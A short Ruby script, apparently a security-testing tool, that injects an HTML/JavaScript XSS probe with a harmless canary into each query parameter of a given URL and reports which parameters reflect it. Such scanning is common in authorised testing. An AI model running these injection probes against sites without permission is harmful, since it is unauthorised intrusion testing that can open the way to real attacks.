#!/usr/bin/env ruby
# xss_bulk_params.rb — run canary reflection across every query param in a URL.
# Usage: ruby xss_bulk_params.rb -u 'https://yourtarget.com/page?a=1&b=2'

require "net/http"
require "uri"
require "json"
require "openssl"
require "optparse"

CANARY = "XSSTESTCANARY"
PROBE = "\"><img src=x onerror=#{CANARY}>"

options = { timeout: 15 }

OptionParser.new do |o|
  o.on("-u", "--url URL", "URL with query string") { |v| options[:url] = v }
  o.on("--json") { options[:json] = true }
end.parse!

abort "missing -u" unless options[:url]

uri = URI(options[:url])
params = URI.decode_www_form(uri.query || "")
abort "no query params" if params.empty?

params.each do |key, _orig|
  test_uri = uri.dup
  q = URI.decode_www_form(test_uri.query || "").to_h
  q[key] = PROBE
  test_uri.query = URI.encode_www_form(q)

  http = Net::HTTP.new(test_uri.host, test_uri.port)
  http.use_ssl = test_uri.scheme == "https"
  http.open_timeout = options[:timeout]
  http.read_timeout = options[:timeout]

  res = http.get(test_uri)
  body = res.body.to_s
  hit = body.include?(CANARY)

  row = { param: key, status: res.code.to_i, reflected: hit, url: test_uri.to_s }
  options[:json] ? puts(JSON.generate(row)) : puts((hit ? "[+]" : "[.]") + " #{key} #{res.code}")
end